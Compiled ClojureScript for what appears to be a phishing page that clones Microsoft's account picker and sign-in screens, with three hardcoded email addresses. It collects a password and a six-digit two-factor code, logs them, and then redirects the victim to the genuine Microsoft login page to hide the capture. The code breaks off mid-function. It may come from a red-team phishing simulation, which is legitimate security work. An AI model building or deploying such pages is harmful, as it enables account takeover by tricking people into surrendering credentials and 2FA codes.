// Compiled by ClojureScript 1.9.908 {}
goog.provide('msft.cljs.core');
goog.require('cljs.core');
goog.require('goog.format.EmailAddress');
goog.require('goog.net.XhrIo');
goog.require('goog.dom');
goog.require('reagent.core');
msft.cljs.core.app_state = reagent.core.atom.call(null,new cljs.core.Keyword(null,"picker","picker",-659389603));
msft.cljs.core.username = reagent.core.atom.call(null,null);
msft.cljs.core.password = reagent.core.atom.call(null,null);
msft.cljs.core.twofa = reagent.core.atom.call(null,null);
msft.cljs.core.last_two = reagent.core.atom.call(null,"__");
msft.cljs.core.accounts = reagent.core.atom.call(null,new cljs.core.PersistentHashSet(null, new cljs.core.PersistentArrayMap(null, 3, ["bpolverini@barbosagrp.com",null,"bpolverini@msnpath.com",null,"becker@pkcsecurity.com",null], null), null));
msft.cljs.core.forget_refs = reagent.core.atom.call(null,cljs.core.PersistentVector.EMPTY);
msft.cljs.core.xhr_success_handler = (function msft$cljs$core$xhr_success_handler(on_success){
return (function (e){
var xhr = e.target;
if(cljs.core.truth_(xhr.isSuccess())){
return on_success.call(null,cljs.core.js__GT_clj.call(null,xhr.getResponseJson()));
} else {
return console.error("POOP");
}
});
});
msft.cljs.core.xhr_get = (function msft$cljs$core$xhr_get(url,on_success){
return goog.net.XhrIo.send(url,msft.cljs.core.xhr_success_handler.call(null,on_success));
});
msft.cljs.core.xhr_post = (function msft$cljs$core$xhr_post(url,content,headers,on_success){
return goog.net.XhrIo.send(url,msft.cljs.core.xhr_success_handler.call(null,on_success),"POST",JSON.stringify(cljs.core.clj__GT_js.call(null,content)),cljs.core.clj__GT_js.call(null,headers));
});
msft.cljs.core.close_forgets = (function msft$cljs$core$close_forgets(){
var seq__12713 = cljs.core.seq.call(null,cljs.core.deref.call(null,msft.cljs.core.forget_refs));
var chunk__12714 = null;
var count__12715 = (0);
var i__12716 = (0);
while(true){
if((i__12716 < count__12715)){
var f = cljs.core._nth.call(null,chunk__12714,i__12716);
cljs.core.reset_BANG_.call(null,f,false);

var G__12717 = seq__12713;
var G__12718 = chunk__12714;
var G__12719 = count__12715;
var G__12720 = (i__12716 + (1));
seq__12713 = G__12717;
chunk__12714 = G__12718;
count__12715 = G__12719;
i__12716 = G__12720;
continue;
} else {
var temp__5290__auto__ = cljs.core.seq.call(null,seq__12713);
if(temp__5290__auto__){
var seq__12713__$1 = temp__5290__auto__;
if(cljs.core.chunked_seq_QMARK_.call(null,seq__12713__$1)){
var c__9690__auto__ = cljs.core.chunk_first.call(null,seq__12713__$1);
var G__12721 = cljs.core.chunk_rest.call(null,seq__12713__$1);
var G__12722 = c__9690__auto__;
var G__12723 = cljs.core.count.call(null,c__9690__auto__);
var G__12724 = (0);
seq__12713 = G__12721;
chunk__12714 = G__12722;
count__12715 = G__12723;
i__12716 = G__12724;
continue;
} else {
var f = cljs.core.first.call(null,seq__12713__$1);
cljs.core.reset_BANG_.call(null,f,false);

var G__12725 = cljs.core.next.call(null,seq__12713__$1);
var G__12726 = null;
var G__12727 = (0);
var G__12728 = (0);
seq__12713 = G__12725;
chunk__12714 = G__12726;
count__12715 = G__12727;
i__12716 = G__12728;
continue;
}
} else {
return null;
}
}
break;
}
});
msft.cljs.core.forget = (function msft$cljs$core$forget(a,show_QMARK_){
var hover_QMARK_ = reagent.core.atom.call(null,false);
return reagent.core.create_class.call(null,new cljs.core.PersistentArrayMap(null, 2, [new cljs.core.Keyword(null,"component-did-mount","component-did-mount",-1126910518),((function (hover_QMARK_){
return (function (){
return cljs.core.swap_BANG_.call(null,msft.cljs.core.forget_refs,cljs.core.conj,show_QMARK_);
});})(hover_QMARK_))
,new cljs.core.Keyword(null,"reagent-render","reagent-render",-985383853),((function (hover_QMARK_){
return (function (a__$1,show_QMARK___$1){
if(cljs.core.truth_(cljs.core.deref.call(null,show_QMARK___$1))){
return new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div.absolute.z3.flex.items-center","div.absolute.z3.flex.items-center",-1505904804),new cljs.core.PersistentArrayMap(null, 4, [new cljs.core.Keyword(null,"on-mouse-enter","on-mouse-enter",-1664921661),((function (hover_QMARK_){
return (function (){
return cljs.core.reset_BANG_.call(null,hover_QMARK_,true);
});})(hover_QMARK_))
,new cljs.core.Keyword(null,"on-mouse-leave","on-mouse-leave",-1864319528),((function (hover_QMARK_){
return (function (){
return cljs.core.reset_BANG_.call(null,hover_QMARK_,false);
});})(hover_QMARK_))
,new cljs.core.Keyword(null,"on-click","on-click",1632826543),((function (hover_QMARK_){
return (function (e){
return cljs.core.swap_BANG_.call(null,msft.cljs.core.accounts,cljs.core.disj,a__$1);
});})(hover_QMARK_))
,new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 6, [new cljs.core.Keyword(null,"width","width",-384071477),"160px",new cljs.core.Keyword(null,"margin","margin",-995903681),"20px 0",new cljs.core.Keyword(null,"border","border",1444987323),"1px solid rgba(0,0,0,0.1)",new cljs.core.Keyword(null,"top","top",-1856271961),(0),new cljs.core.Keyword(null,"right","right",-452581833),"10px",new cljs.core.Keyword(null,"background-color","background-color",570434026),(cljs.core.truth_(cljs.core.deref.call(null,hover_QMARK_))?"#e6e6e6":"#fff")], null)], null),new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"a","a",-2123407586),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 6, [new cljs.core.Keyword(null,"padding","padding",1660304693),"11px 12px 13px",new cljs.core.Keyword(null,"background-color","background-color",570434026),"rgba(0,0,0,0.05)",new cljs.core.Keyword(null,"width","width",-384071477),"100%",new cljs.core.Keyword(null,"outline","outline",793464534),new cljs.core.Keyword(null,"none","none",1333468478),new cljs.core.Keyword(null,"color","color",1011675173),new cljs.core.Keyword(null,"inherit","inherit",-1840815422),new cljs.core.Keyword(null,"cursor","cursor",1011937484),new cljs.core.Keyword(null,"pointer","pointer",85071187)], null)], null),"Forget"], null)], null);
} else {
return null;
}
});})(hover_QMARK_))
], null));
});
msft.cljs.core.dots = (function msft$cljs$core$dots(a){
var focused_QMARK_ = reagent.core.atom.call(null,false);
var show_QMARK_ = reagent.core.atom.call(null,false);
return ((function (focused_QMARK_,show_QMARK_){
return (function (a__$1){
return new cljs.core.PersistentVector(null, 4, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div.relative","div.relative",430334058),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"on-click","on-click",1632826543),((function (focused_QMARK_,show_QMARK_){
return (function (e){
e.stopPropagation();

return cljs.core.swap_BANG_.call(null,show_QMARK_,cljs.core.not);
});})(focused_QMARK_,show_QMARK_))
], null),new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.forget,a__$1,show_QMARK_], null),new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div","div",1057191632),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 2, [new cljs.core.Keyword(null,"padding","padding",1660304693),"4px 8px",new cljs.core.Keyword(null,"border","border",1444987323),(cljs.core.truth_(cljs.core.deref.call(null,focused_QMARK_))?"1px dashed #000":"1px solid rgba(0,0,0,0)")], null)], null),new cljs.core.PersistentVector(null, 2, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"img","img",1442687358),new cljs.core.PersistentArrayMap(null, 5, [new cljs.core.Keyword(null,"src","src",-1651076051),"dots.svg",new cljs.core.Keyword(null,"tabIndex","tabIndex",-169286716),(0),new cljs.core.Keyword(null,"on-focus","on-focus",-13737624),((function (focused_QMARK_,show_QMARK_){
return (function (e){
cljs.core.reset_BANG_.call(null,focused_QMARK_,true);

return e.stopPropagation();
});})(focused_QMARK_,show_QMARK_))
,new cljs.core.Keyword(null,"on-blur","on-blur",814300747),((function (focused_QMARK_,show_QMARK_){
return (function (e){
cljs.core.reset_BANG_.call(null,focused_QMARK_,false);

return e.stopPropagation();
});})(focused_QMARK_,show_QMARK_))
,new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 3, [new cljs.core.Keyword(null,"height","height",1025178622),"16px",new cljs.core.Keyword(null,"outline","outline",793464534),new cljs.core.Keyword(null,"none","none",1333468478),new cljs.core.Keyword(null,"width","width",-384071477),"16px"], null)], null)], null)], null)], null);
});
;})(focused_QMARK_,show_QMARK_))
});
msft.cljs.core.add_account = (function msft$cljs$core$add_account(){
var hover_QMARK_ = reagent.core.atom.call(null,false);
var focused_QMARK_ = reagent.core.atom.call(null,false);
return ((function (hover_QMARK_,focused_QMARK_){
return (function (){
return new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div.flex.justify-between.click","div.flex.justify-between.click",-935289606),new cljs.core.PersistentArrayMap(null, 7, [new cljs.core.Keyword(null,"on-mouse-enter","on-mouse-enter",-1664921661),((function (hover_QMARK_,focused_QMARK_){
return (function (){
return cljs.core.reset_BANG_.call(null,hover_QMARK_,true);
});})(hover_QMARK_,focused_QMARK_))
,new cljs.core.Keyword(null,"on-mouse-leave","on-mouse-leave",-1864319528),((function (hover_QMARK_,focused_QMARK_){
return (function (){
return cljs.core.reset_BANG_.call(null,hover_QMARK_,false);
});})(hover_QMARK_,focused_QMARK_))
,new cljs.core.Keyword(null,"on-focus","on-focus",-13737624),((function (hover_QMARK_,focused_QMARK_){
return (function (){
return cljs.core.reset_BANG_.call(null,focused_QMARK_,true);
});})(hover_QMARK_,focused_QMARK_))
,new cljs.core.Keyword(null,"on-blur","on-blur",814300747),((function (hover_QMARK_,focused_QMARK_){
return (function (){
return cljs.core.reset_BANG_.call(null,focused_QMARK_,false);
});})(hover_QMARK_,focused_QMARK_))
,new cljs.core.Keyword(null,"on-click","on-click",1632826543),((function (hover_QMARK_,focused_QMARK_){
return (function (){
return cljs.core.reset_BANG_.call(null,msft.cljs.core.app_state,new cljs.core.Keyword(null,"adder","adder",-886849773));
});})(hover_QMARK_,focused_QMARK_))
,new cljs.core.Keyword(null,"tabIndex","tabIndex",-169286716),(0),new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 4, [new cljs.core.Keyword(null,"outline","outline",793464534),new cljs.core.Keyword(null,"none","none",1333468478),new cljs.core.Keyword(null,"padding","padding",1660304693),"12px",new cljs.core.Keyword(null,"background-color","background-color",570434026),(cljs.core.truth_(cljs.core.deref.call(null,hover_QMARK_))?"#e6e6e6":null),new cljs.core.Keyword(null,"border","border",1444987323),(cljs.core.truth_(cljs.core.deref.call(null,focused_QMARK_))?"1px dashed #000":"1px solid rgba(0,0,0,0)")], null)], null),new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div.flex.items-center","div.flex.items-center",-1537844053),new cljs.core.PersistentVector(null, 2, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"img","img",1442687358),new cljs.core.PersistentArrayMap(null, 2, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 2, [new cljs.core.Keyword(null,"width","width",-384071477),"48px",new cljs.core.Keyword(null,"height","height",1025178622),"48px"], null),new cljs.core.Keyword(null,"src","src",-1651076051),"add.svg"], null)], null),new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"p","p",151049309),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"margin-left","margin-left",2015598377),"12px"], null)], null),"Use another account"], null)], null)], null);
});
;})(hover_QMARK_,focused_QMARK_))
});
msft.cljs.core.select_email = (function msft$cljs$core$select_email(email){
cljs.core.reset_BANG_.call(null,msft.cljs.core.username,email);

return cljs.core.reset_BANG_.call(null,msft.cljs.core.app_state,new cljs.core.Keyword(null,"passworder","passworder",902472555));
});
msft.cljs.core.select_password = (function msft$cljs$core$select_password(p){
cljs.core.reset_BANG_.call(null,msft.cljs.core.password,p);

return setTimeout((function (){
return cljs.core.reset_BANG_.call(null,msft.cljs.core.app_state,new cljs.core.Keyword(null,"twofaer","twofaer",1321632499));
}),(2000));
});
msft.cljs.core.select_twofa = (function msft$cljs$core$select_twofa(t){
cljs.core.reset_BANG_.call(null,msft.cljs.core.twofa,t);

console.log(cljs.core.deref.call(null,msft.cljs.core.username));

console.log(cljs.core.deref.call(null,msft.cljs.core.password));

console.log(t);

return setTimeout((function (){
return location.replace("https://login.microsoftonline.com/common/login");
}),(1500));
});
msft.cljs.core.user_accounts = (function msft$cljs$core$user_accounts(email){
var hover_QMARK_ = reagent.core.atom.call(null,false);
var focused_QMARK_ = reagent.core.atom.call(null,false);
var id = [cljs.core.str.cljs$core$IFn$_invoke$arity$1(cljs.core.gensym.call(null))].join('');
return ((function (hover_QMARK_,focused_QMARK_,id){
return (function (email__$1){
return new cljs.core.PersistentVector(null, 4, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div.flex.justify-between.click","div.flex.justify-between.click",-935289606),cljs.core.PersistentHashMap.fromArrays([new cljs.core.Keyword(null,"on-mouse-enter","on-mouse-enter",-1664921661),new cljs.core.Keyword(null,"tabIndex","tabIndex",-169286716),new cljs.core.Keyword(null,"on-focus","on-focus",-13737624),new cljs.core.Keyword(null,"on-blur","on-blur",814300747),new cljs.core.Keyword(null,"on-click","on-click",1632826543),new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.Keyword(null,"id","id",-1388402092),new cljs.core.Keyword(null,"on-mouse-leave","on-mouse-leave",-1864319528),new cljs.core.Keyword(null,"on-key-down","on-key-down",-1374733765)],[((function (hover_QMARK_,focused_QMARK_,id){
return (function (){
return cljs.core.reset_BANG_.call(null,hover_QMARK_,true);
});})(hover_QMARK_,focused_QMARK_,id))
,(0),((function (hover_QMARK_,focused_QMARK_,id){
return (function (e){
return cljs.core.reset_BANG_.call(null,focused_QMARK_,true);
});})(hover_QMARK_,focused_QMARK_,id))
,((function (hover_QMARK_,focused_QMARK_,id){
return (function (){
return cljs.core.reset_BANG_.call(null,focused_QMARK_,false);
});})(hover_QMARK_,focused_QMARK_,id))
,((function (hover_QMARK_,focused_QMARK_,id){
return (function (e){
return msft.cljs.core.select_email.call(null,email__$1);
});})(hover_QMARK_,focused_QMARK_,id))
,new cljs.core.PersistentArrayMap(null, 4, [new cljs.core.Keyword(null,"padding","padding",1660304693),"12px",new cljs.core.Keyword(null,"outline","outline",793464534),new cljs.core.Keyword(null,"none","none",1333468478),new cljs.core.Keyword(null,"border","border",1444987323),(cljs.core.truth_(cljs.core.deref.call(null,focused_QMARK_))?"1px dashed #000":"1px solid rgba(0,0,0,0)"),new cljs.core.Keyword(null,"background-color","background-color",570434026),(cljs.core.truth_(cljs.core.deref.call(null,hover_QMARK_))?"#e6e6e6":null)], null),id,((function (hover_QMARK_,focused_QMARK_,id){
return (function (){
return cljs.core.reset_BANG_.call(null,hover_QMARK_,false);
});})(hover_QMARK_,focused_QMARK_,id))
,((function (hover_QMARK_,focused_QMARK_,id){
return (function (e){
if(cljs.core._EQ_.call(null,"Enter",e.key)){
return msft.cljs.core.select_email.call(null,email__$1);
} else {
return null;
}
});})(hover_QMARK_,focused_QMARK_,id))
]),new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div.flex.items-center","div.flex.items-center",-1537844053),new cljs.core.PersistentVector(null, 2, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"img","img",1442687358),new cljs.core.PersistentArrayMap(null, 2, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 2, [new cljs.core.Keyword(null,"width","width",-384071477),"48px",new cljs.core.Keyword(null,"height","height",1025178622),"48px"], null),new cljs.core.Keyword(null,"src","src",-1651076051),"user.svg"], null)], null),new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"p","p",151049309),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"margin-left","margin-left",2015598377),"12px"], null)], null),email__$1], null)], null),new cljs.core.PersistentVector(null, 2, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.dots,email__$1], null)], null);
});
;})(hover_QMARK_,focused_QMARK_,id))
});
msft.cljs.core.titled_box = (function msft$cljs$core$titled_box(title,elem){
return new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div","div",1057191632),new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div","div",1057191632),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 4, [new cljs.core.Keyword(null,"font-size","font-size",-1847940346),"24px",new cljs.core.Keyword(null,"margin","margin",-995903681),"16px 0",new cljs.core.Keyword(null,"line-height","line-height",1870784992),"28px",new cljs.core.Keyword(null,"font-weight","font-weight",2085804583),(300)], null)], null),title], null),elem], null);
});
msft.cljs.core.picker = (function msft$cljs$core$picker(){
return new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.titled_box,"Pick an account",new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div","div",1057191632),(function (){var iter__9641__auto__ = (function msft$cljs$core$picker_$_iter__12729(s__12730){
return (new cljs.core.LazySeq(null,(function (){
var s__12730__$1 = s__12730;
while(true){
var temp__5290__auto__ = cljs.core.seq.call(null,s__12730__$1);
if(temp__5290__auto__){
var s__12730__$2 = temp__5290__auto__;
if(cljs.core.chunked_seq_QMARK_.call(null,s__12730__$2)){
var c__9639__auto__ = cljs.core.chunk_first.call(null,s__12730__$2);
var size__9640__auto__ = cljs.core.count.call(null,c__9639__auto__);
var b__12732 = cljs.core.chunk_buffer.call(null,size__9640__auto__);
if((function (){var i__12731 = (0);
while(true){
if((i__12731 < size__9640__auto__)){
var a = cljs.core._nth.call(null,c__9639__auto__,i__12731);
cljs.core.chunk_append.call(null,b__12732,cljs.core.with_meta(new cljs.core.PersistentVector(null, 2, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.user_accounts,a], null),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"key","key",-1516042587),a], null)));

var G__12733 = (i__12731 + (1));
i__12731 = G__12733;
continue;
} else {
return true;
}
break;
}
})()){
return cljs.core.chunk_cons.call(null,cljs.core.chunk.call(null,b__12732),msft$cljs$core$picker_$_iter__12729.call(null,cljs.core.chunk_rest.call(null,s__12730__$2)));
} else {
return cljs.core.chunk_cons.call(null,cljs.core.chunk.call(null,b__12732),null);
}
} else {
var a = cljs.core.first.call(null,s__12730__$2);
return cljs.core.cons.call(null,cljs.core.with_meta(new cljs.core.PersistentVector(null, 2, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.user_accounts,a], null),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"key","key",-1516042587),a], null)),msft$cljs$core$picker_$_iter__12729.call(null,cljs.core.rest.call(null,s__12730__$2)));
}
} else {
return null;
}
break;
}
}),null,null));
});
return iter__9641__auto__.call(null,cljs.core.deref.call(null,msft.cljs.core.accounts));
})(),new cljs.core.PersistentVector(null, 1, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.add_account], null)], null)], null);
});
msft.cljs.core.submit = (function msft$cljs$core$submit(text,error_atom,on_click){
var focused_QMARK_ = reagent.core.atom.call(null,false);
var hover_QMARK_ = reagent.core.atom.call(null,false);
return ((function (focused_QMARK_,hover_QMARK_){
return (function (text__$1,error_atom__$1,on_click__$1){
return new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"button.click","button.click",1698437844),cljs.core.PersistentHashMap.fromArrays([new cljs.core.Keyword(null,"on-mouse-enter","on-mouse-enter",-1664921661),new cljs.core.Keyword(null,"tabIndex","tabIndex",-169286716),new cljs.core.Keyword(null,"on-focus","on-focus",-13737624),new cljs.core.Keyword(null,"on-blur","on-blur",814300747),new cljs.core.Keyword(null,"type","type",1174270348),new cljs.core.Keyword(null,"on-click","on-click",1632826543),new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.Keyword(null,"on-mouse-leave","on-mouse-leave",-1864319528),new cljs.core.Keyword(null,"on-key-down","on-key-down",-1374733765)],[((function (focused_QMARK_,hover_QMARK_){
return (function (){
return cljs.core.reset_BANG_.call(null,hover_QMARK_,true);
});})(focused_QMARK_,hover_QMARK_))
,(0),((function (focused_QMARK_,hover_QMARK_){
return (function (){
return cljs.core.reset_BANG_.call(null,focused_QMARK_,true);
});})(focused_QMARK_,hover_QMARK_))
,((function (focused_QMARK_,hover_QMARK_){
return (function (){
return cljs.core.reset_BANG_.call(null,focused_QMARK_,false);
});})(focused_QMARK_,hover_QMARK_))
,"button",on_click__$1,cljs.core.PersistentHashMap.fromArrays([new cljs.core.Keyword(null,"border-style","border-style",-485574304),new cljs.core.Keyword(null,"min-width","min-width",1926193728),new cljs.core.Keyword(null,"text-overflow","text-overflow",-1022366814),new cljs.core.Keyword(null,"color","color",1011675173),new cljs.core.Keyword(null,"text-align","text-align",1786091845),new cljs.core.Keyword(null,"vertical-align","vertical-align",651007333),new cljs.core.Keyword(null,"white-space","white-space",-707351930),new cljs.core.Keyword(null,"overflow","overflow",2058931880),new cljs.core.Keyword(null,"background-color","background-color",570434026),new cljs.core.Keyword(null,"width","width",-384071477),new cljs.core.Keyword(null,"max-width","max-width",-1939924051),new cljs.core.Keyword(null,"border-width","border-width",-1512605390),new cljs.core.Keyword(null,"padding","padding",1660304693),new cljs.core.Keyword(null,"outline","outline",793464534),new cljs.core.Keyword(null,"border-color","border-color",-2059162761),new cljs.core.Keyword(null,"text-decoration","text-decoration",1836813207),new cljs.core.Keyword(null,"height","height",1025178622),new cljs.core.Keyword(null,"margin","margin",-995903681)],[new cljs.core.Keyword(null,"solid","solid",-2023773691),"100px",new cljs.core.Keyword(null,"ellipsis","ellipsis",998505738),"white",new cljs.core.Keyword(null,"center","center",-748944368),new cljs.core.Keyword(null,"middle","middle",-701029031),new cljs.core.Keyword(null,"nowrap","nowrap",457264988),new cljs.core.Keyword(null,"hidden","hidden",-312506092),(cljs.core.truth_((function (){var or__8759__auto__ = cljs.core.deref.call(null,focused_QMARK_);
if(cljs.core.truth_(or__8759__auto__)){
return or__8759__auto__;
} else {
return cljs.core.deref.call(null,hover_QMARK_);
}
})())?"#005da6":"#0067b8"),"100%","100%","2px","4px 12px",new cljs.core.Keyword(null,"none","none",1333468478),(cljs.core.truth_(cljs.core.deref.call(null,focused_QMARK_))?"#000":new cljs.core.Keyword(null,"transparent","transparent",-2073609949)),(cljs.core.truth_(cljs.core.deref.call(null,focused_QMARK_))?new cljs.core.Keyword(null,"underline","underline",2018066703):null),"38px","0"]),((function (focused_QMARK_,hover_QMARK_){
return (function (){
return cljs.core.reset_BANG_.call(null,hover_QMARK_,false);
});})(focused_QMARK_,hover_QMARK_))
,((function (focused_QMARK_,hover_QMARK_){
return (function (e){
if(cljs.core._EQ_.call(null,e.key,"Enter")){
return on_click__$1.call(null);
} else {
return null;
}
});})(focused_QMARK_,hover_QMARK_))
]),text__$1], null);
});
;})(focused_QMARK_,hover_QMARK_))
});
msft.cljs.core.back = (function msft$cljs$core$back(state,text){
var hover_QMARK_ = reagent.core.atom.call(null,false);
var focused_QMARK_ = reagent.core.atom.call(null,false);
return ((function (hover_QMARK_,focused_QMARK_){
return (function (state__$1,text__$1){
return new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"button.click","button.click",1698437844),cljs.core.PersistentHashMap.fromArrays([new cljs.core.Keyword(null,"on-mouse-enter","on-mouse-enter",-1664921661),new cljs.core.Keyword(null,"tabIndex","tabIndex",-169286716),new cljs.core.Keyword(null,"on-focus","on-focus",-13737624),new cljs.core.Keyword(null,"on-blur","on-blur",814300747),new cljs.core.Keyword(null,"type","type",1174270348),new cljs.core.Keyword(null,"on-click","on-click",1632826543),new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.Keyword(null,"on-mouse-leave","on-mouse-leave",-1864319528),new cljs.core.Keyword(null,"on-key-down","on-key-down",-1374733765)],[((function (hover_QMARK_,focused_QMARK_){
return (function (){
return cljs.core.reset_BANG_.call(null,hover_QMARK_,true);
});})(hover_QMARK_,focused_QMARK_))
,(0),((function (hover_QMARK_,focused_QMARK_){
return (function (){
return cljs.core.reset_BANG_.call(null,focused_QMARK_,true);
});})(hover_QMARK_,focused_QMARK_))
,((function (hover_QMARK_,focused_QMARK_){
return (function (){
return cljs.core.reset_BANG_.call(null,focused_QMARK_,false);
});})(hover_QMARK_,focused_QMARK_))
,"button",((function (hover_QMARK_,focused_QMARK_){
return (function (){
return cljs.core.reset_BANG_.call(null,msft.cljs.core.app_state,state__$1);
});})(hover_QMARK_,focused_QMARK_))
,cljs.core.PersistentHashMap.fromArrays([new cljs.core.Keyword(null,"border-style","border-style",-485574304),new cljs.core.Keyword(null,"min-width","min-width",1926193728),new cljs.core.Keyword(null,"text-overflow","text-overflow",-1022366814),new cljs.core.Keyword(null,"color","color",1011675173),new cljs.core.Keyword(null,"text-align","text-align",1786091845),new cljs.core.Keyword(null,"vertical-align","vertical-align",651007333),new cljs.core.Keyword(null,"white-space","white-space",-707351930),new cljs.core.Keyword(null,"overflow","overflow",2058931880),new cljs.core.Keyword(null,"background-color","background-color",570434026),new cljs.core.Keyword(null,"width","width",-384071477),new cljs.core.Keyword(null,"max-width","max-width",-1939924051),new cljs.core.Keyword(null,"border-width","border-width",-1512605390),new cljs.core.Keyword(null,"padding","padding",1660304693),new cljs.core.Keyword(null,"outline","outline",793464534),new cljs.core.Keyword(null,"border-color","border-color",-2059162761),new cljs.core.Keyword(null,"text-decoration","text-decoration",1836813207),new cljs.core.Keyword(null,"height","height",1025178622),new cljs.core.Keyword(null,"margin","margin",-995903681)],[new cljs.core.Keyword(null,"solid","solid",-2023773691),"100px",new cljs.core.Keyword(null,"ellipsis","ellipsis",998505738),"#000",new cljs.core.Keyword(null,"center","center",-748944368),new cljs.core.Keyword(null,"middle","middle",-701029031),new cljs.core.Keyword(null,"nowrap","nowrap",457264988),new cljs.core.Keyword(null,"hidden","hidden",-312506092),(cljs.core.truth_((function (){var or__8759__auto__ = cljs.core.deref.call(null,focused_QMARK_);
if(cljs.core.truth_(or__8759__auto__)){
return or__8759__auto__;
} else {
return cljs.core.deref.call(null,hover_QMARK_);
}
})())?"rgba(0,0,0,0.3)":"rgba(0,0,0,0.2)"),"100%","100%","2px","4px 12px",new cljs.core.Keyword(null,"none","none",1333468478),(cljs.core.truth_(cljs.core.deref.call(null,focused_QMARK_))?"#000":new cljs.core.Keyword(null,"transparent","transparent",-2073609949)),(cljs.core.truth_(cljs.core.deref.call(null,focused_QMARK_))?new cljs.core.Keyword(null,"underline","underline",2018066703):null),"38px","0"]),((function (hover_QMARK_,focused_QMARK_){
return (function (){
return cljs.core.reset_BANG_.call(null,false,true);
});})(hover_QMARK_,focused_QMARK_))
,((function (hover_QMARK_,focused_QMARK_){
return (function (e){
if(cljs.core._EQ_.call(null,e.key,"Enter")){
return cljs.core.reset_BANG_.call(null,msft.cljs.core.app_state,state__$1);
} else {
return null;
}
});})(hover_QMARK_,focused_QMARK_))
]),text__$1], null);
});
;})(hover_QMARK_,focused_QMARK_))
});
msft.cljs.core.link = (function msft$cljs$core$link(text,href){
return new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"a","a",-2123407586),new cljs.core.PersistentArrayMap(null, 2, [new cljs.core.Keyword(null,"href","href",-793805698),href,new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 5, [new cljs.core.Keyword(null,"color","color",1011675173),"#0067b8",new cljs.core.Keyword(null,"text-decoration","text-decoration",1836813207),new cljs.core.Keyword(null,"none","none",1333468478),new cljs.core.Keyword(null,"font-size","font-size",-1847940346),"0.8125rem",new cljs.core.Keyword(null,"display","display",242065432),new cljs.core.Keyword(null,"block","block",664686210),new cljs.core.Keyword(null,"margin-bottom","margin-bottom",388334941),"16px"], null)], null),text], null);
});
msft.cljs.core.valid_email_QMARK_ = (function msft$cljs$core$valid_email_QMARK_(e){
return (new goog.format.EmailAddress(e)).isValid();
});
msft.cljs.core.valid_password_QMARK_ = (function msft$cljs$core$valid_password_QMARK_(p){
return ((7) <= p.length);
});
msft.cljs.core.valid_twofa_QMARK_ = (function msft$cljs$core$valid_twofa_QMARK_(t){
return t.match(/^[0-9][0-9][0-9][0-9][0-9][0-9]$/);
});
msft.cljs.core.input = (function msft$cljs$core$input(value,placeholder,error_text,valid_QMARK_,error_QMARK_,on_key_down){
var focused_QMARK_ = reagent.core.atom.call(null,false);
return ((function (focused_QMARK_){
